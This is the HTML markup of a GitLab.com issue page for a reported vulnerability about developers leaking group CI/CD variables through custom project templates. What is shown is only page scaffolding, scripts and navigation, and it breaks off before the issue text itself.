





<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality (#416244) · Issues · GitLab.org / GitLab · GitLab</title>
<script nonce="OoQw4Jfj38gL2KrNEBLa5g==">
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.com/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=100;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.analytics_url="https://collector.prd-278964.gl-product-analytics.com";gon.analytics_id="715db59f-f350-4bfd-aef8-e7a7f0c023f0";gon.sentry_dsn="https://f5573e26de8f4293b285e556c35dfd6e@new-sentry.gitlab.net/4";gon.sentry_environment="gprd";gon.sentry_clientside_traces_sample_rate=0.05;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="6LfAERQTAAAAAL4GYSiAMGLbcLyUIBSfPrDNJgeC";gon.gitlab_url="https://gitlab.com";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="7dff8329d3f";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-bd26211944b9d072037ec97cb138f1a52cd03ef185cd38b8d1fcc963245199a1.css";gon.emoji_backend_version=4;gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=null;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=0;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=true;gon.jh=false;gon.dot_com=true;gon.uf_error_prefix="UF";gon.pat_prefix="glpat-";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"findAndReplace":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"duoChatDynamicDimension":false,"advancedContextResolver":true,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":true,"workItemsBeta":true,"workItemsAlpha":false,"workItems":true,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false,"okrsMvc":false,"workItemEpics":true};gon.roadmap_epics_limit=1000;gon.subscriptions_url="https://customers.gitlab.com";gon.subscriptions_legacy_sign_in_url="https://customers.gitlab.com/customers/sign_in?legacy=true";gon.billing_accounts_url="https://customers.gitlab.com/billing_accounts";gon.payment_form_url="https://customers.gitlab.com/payment_forms/cc_validation";gon.payment_validation_form_id="payment_method_validation";gon.licensed_features={"escalationPolicies":true,"okrs":true};gon.abilities={"summarizeComments":false,"measureCommentTemperature":false};
//]]>
</script>


<script nonce="OoQw4Jfj38gL2KrNEBLa5g==">
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/gitlab-org/gitlab/-/issues/416244/related_branches":{},"/gitlab-org/gitlab/-/issues/416244/discussions.json?per_page=20":{},"/gitlab-org/gitlab/-/issues/416244.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = [{"query":"query getDesignList($fullPath: ID!, $iid: String!, $atVersion: DesignManagementVersionID) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      designCollection {\n        __typename\n        copyState\n        designs(atVersion: $atVersion) {\n          __typename\n          nodes {\n            __typename\n            id\n            event\n            filename\n            notesCount\n            image\n            imageV432x230\n            currentUserTodos(state: pending) {\n              __typename\n              nodes {\n                __typename\n                id\n              }\n            }\n          }\n        }\n        versions {\n          __typename\n          nodes {\n            __typename\n            id\n            sha\n            createdAt\n            author {\n              __typename\n              id\n              name\n              avatarUrl\n            }\n          }\n        }\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"416244","atVersion":null}},{"query":"query permissions($fullPath: ID!, $iid: String!) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      userPermissions {\n        __typename\n        createDesign\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab","iid":"416244"}}];

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"oziZ-F1DpjXKT9J4IcF7-3WN4TyxNXtydIO448zSg6thY8AUHdrox_SQe6Mqb1MgcTVnJW6Y-k0DIOW6b4niSg","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.com/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-93041147ba57615da1f7f3a0a16aaf70c487cd3c6e1f97eb5cb73be9b92ccec4.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-f20ae9b5b8c9a0f793e3ffa2ddc13953bfd683e1d351c8e6cc75e0fcd4ddde90.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-b9f383aefa56f0a72990496e4a4b3aaf2c525843283a1c0c3d85876537187397.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-e25480d2326300d5c49ad31dbd847a53e39fc33a5fd595a961dd7238e411b558.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-7e727ab1e91b421915feadeb04a1b9d57213cb1b2f8f56f4d894b34d6b42e9b3.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-22a76cdd1fe2ae5431b7ff603f86212acaf81b49c4a932f19e3b3222dc1881ee.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" />
<link rel="stylesheet" href="/assets/tailwind-165abe9feeeb60e8b98db786e1b7f7fab1284c31e124875c18ff37e26cec5fd2.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" />

<script src="/assets/webpack/runtime.0e140728.bundle.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/main.07687e59.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/tracker.493c474d.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/analytics.4c4c0b50.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script nonce="OoQw4Jfj38gL2KrNEBLa5g==">
//<![CDATA[
window.snowplowOptions = {"namespace":"gl","hostname":"snowplowprd.trx.gitlab.net","cookieDomain":".gitlab.com","appId":"gitlab","formTracking":true,"linkClickTracking":true}

gl = window.gl || {};
gl.snowplowStandardContext = {"schema":"iglu:com.gitlab/gitlab_standard/jsonschema/1-1-1","data":{"environment":"production","source":"gitlab-rails","correlation_id":"01JH87QMK68HPXB4E43RACSQPF","plan":"gold","extra":{},"user_id":null,"global_user_id":null,"is_gitlab_team_member":null,"namespace_id":9970,"project_id":278964,"feature_enabled_by_namespace_ids":null,"realm":"saas","instance_id":"ea8bf810-1d6f-4a6a-b4fd-93e8cbd8b57f","host_name":"gitlab-cny-webservice-web-77f66f9f8d-wftbc","instance_version":"17.8.0","context_generated_at":"2025-01-10T13:51:20.027Z"}}
gl.snowplowPseudonymizedPageUrl = "https://gitlab.com/namespace9970/project278964/-/issues/416244";
gl.maskedDefaultReferrerUrl = null;
gl.ga4MeasurementId = 'G-ENFH3X7M5Y';


//]]>
</script>
<link rel="preload" href="/assets/application_utilities-58bec0f2dc46133fc9e8548af9854688398e9d7263cc0fd95ec5739f2a069dec.css" as="style" type="text/css" nonce="hPxta8qICKDcuaGOE6kQiA==">
<link rel="preload" href="/assets/application-93041147ba57615da1f7f3a0a16aaf70c487cd3c6e1f97eb5cb73be9b92ccec4.css" as="style" type="text/css" nonce="hPxta8qICKDcuaGOE6kQiA==">
<link rel="preload" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" as="style" type="text/css" nonce="hPxta8qICKDcuaGOE6kQiA==">
<link crossorigin="" href="https://snowplowprd.trx.gitlab.net" rel="preconnect">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-1e0a5107ea3bbd4be93e8ad2c503467e43166cd37e4293570b490e0812ede98b.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-Italic-38eaf1a569a54ab28c58b92a4a8de3afb96b6ebc250cf372003a7b38151848cc.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-08d2c5e8ff8fd3d2d6ec55bc7713380f8981c35f9d2df14e12b835464d6e8f23.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-Italic-38e58d8df29485a20c550da1d0111e2c2169f6dcbcf894f2cd3afbdd97bcc588.woff2" rel="preload">
<link rel="preload" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" as="style" type="text/css" nonce="hPxta8qICKDcuaGOE6kQiA==">



<script src="/assets/webpack/sentry.b707854c.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>

<script src="/assets/webpack/10.983bd1ac.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/12.0b1b07c1.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/14.52ad8cab.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/commons-pages.groups.analytics.dashboards-pages.groups.harbor.repositories-pages.groups.iteration_ca-b07ae190.ec7189d6.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.570d5e43.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.f7a558c9.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/super_sidebar.566fc613.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-bce54798.33350df1.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>
<script src="/assets/webpack/pages.projects.issues.show.3ad61df3.chunk.js" defer="defer" nonce="OoQw4Jfj38gL2KrNEBLa5g=="></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality (#416244) · Issues · GitLab.org / GitLab · GitLab" property="og:title">
<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." property="og:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.com/gitlab-org/gitlab/-/issues/416244" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality (#416244) · Issues · GitLab.org / GitLab · GitLab" property="twitter:title">
<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." property="twitter:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/278964/project_avatar.png" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="GitLab SecurityBot"><meta property="twitter:label2" content="Assignee"><meta property="twitter:data2" content="Joe Woodward">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="AyrokVm_BTSxCOlKyzdLt1SVnsXyrZbFgN_NEUF-AmjBcbF9GSZLxo_XQJHAmWNsUC0Y3C0AF_r3fJBI4iVjiQ" />
<meta name="csp-nonce" content="OoQw4Jfj38gL2KrNEBLa5g==" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" id="favicon" data-original-href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content="⚠ Please read the process on how to fix security issues before starting to work on the issue. Vulnerabilities must be..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-group="gitlab-org" data-group-full-path="gitlab-org" data-namespace-id="9970" data-page="projects:issues:show" data-page-type-id="416244" data-project="gitlab" data-project-full-path="gitlab-org/gitlab" data-project-id="278964">
<script nonce="OoQw4Jfj38gL2KrNEBLa5g==">
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"epics":"/gitlab-org/gitlab/-/autocomplete_sources/epics","iterations":"/gitlab-org/gitlab/-/autocomplete_sources/iterations","vulnerabilities":"/gitlab-org/gitlab/-/autocomplete_sources/vulnerabilities","members":"/gitlab-org/gitlab/-/autocomplete_sources/members?type=Issue\u0026type_id=416244","issues":"/gitlab-org/gitlab/-/autocomplete_sources/issues","mergeRequests":"/gitlab-org/gitlab/-/autocomplete_sources/merge_requests","labels":"/gitlab-org/gitlab/-/autocomplete_sources/labels?type=Issue\u0026type_id=416244","milestones":"/gitlab-org/gitlab/-/autocomplete_sources/milestones","commands":"/gitlab-org/gitlab/-/autocomplete_sources/commands?type=Issue\u0026type_id=416244","snippets":"/gitlab-org/gitlab/-/autocomplete_sources/snippets","contacts":"/gitlab-org/gitlab/-/autocomplete_sources/contacts?type=Issue\u0026type_id=416244","wikis":null};


//]]>
</script>
<script nonce="OoQw4Jfj38gL2KrNEBLa5g==">
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="/"><svg aria-hidden="true" role="img" class="tanuki-logo" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path class="tanuki-shape tanuki" d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#E24329"/>
  <path class="tanuki-shape right-cheek" d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#FC6D26"/>
  <path class="tanuki-shape chin" d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z"
        fill="#FCA326"/>
  <path class="tanuki-shape left-cheek" d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z"
        fill="#FC6D26"/>
</svg>

</a><a class="gl-badge badge badge-pill badge-success canary-badge" data-testid="canary_badge_link" href="https://next.gitlab.com" rel="noopener noreferrer" target="_blank"><span class="gl-badge-content">Next
</span></a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item header-logged-out-dropdown md:gl-hidden">
<button class="header-logged-out-toggle" data-toggle="dropdown" type="button">
<span class="gl-sr-only">
Menu
</span>
<svg class="s16" data-testid="hamburger-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#hamburger"></use></svg>
</button>
<div class="dropdown-menu">
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li class="header-logged-out-nav-item gl-hidden gl-inline-block">
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li class="header-logged-out-nav-item">
<a class="gl-button btn btn-md btn-confirm !gl-inline-flex" href="/users/sign_up"><span class="gl-button-text">
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/gitlab-org/gitlab/-/files/master?format=json&quot;,&quot;project_blob_url&quot;:&quot;/gitlab-org/gitlab/-/blob/master&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="true" data-root-path="/" data-sidebar="{&quot;whats_new_most_recent_release_items_count&quot;:6,&quot;whats_new_version_digest&quot;:&quot;c955dbe1b30a1468b032fe6896086eda50f884ff9559d966e5ef75c34eee3ff0&quot;,&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;GitLab&quot;,&quot;avatar&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;,&quot;entity_id&quot;:278964,&quot;link&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;pill_count_field&quot;:&quot;openIssuesCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/milestones&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;iterations&quot;,&quot;title&quot;:&quot;Iterations&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/cadences&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;requirements&quot;,&quot;title&quot;:&quot;Requirements&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/requirements_management/requirements&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;pill_count_field&quot;:&quot;openMergeRequestsCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tree/master&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/commits/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/network/master?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/compare?from=master\u0026to=master&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_snippets&quot;,&quot;title&quot;:&quot;Snippets&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/snippets&quot;,&quot;link_classes&quot;:&quot;shortcuts-snippets&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;file_locks&quot;,&quot;title&quot;:&quot;Locked files&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/path_locks&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;test_cases&quot;,&quot;title&quot;:&quot;Test cases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/quality/test_cases&quot;,&quot;link_classes&quot;:&quot;shortcuts-test-cases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;packages_registry&quot;,&quot;title&quot;:&quot;Package Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/packages&quot;,&quot;link_classes&quot;:&quot;shortcuts-container-registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/container_registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model 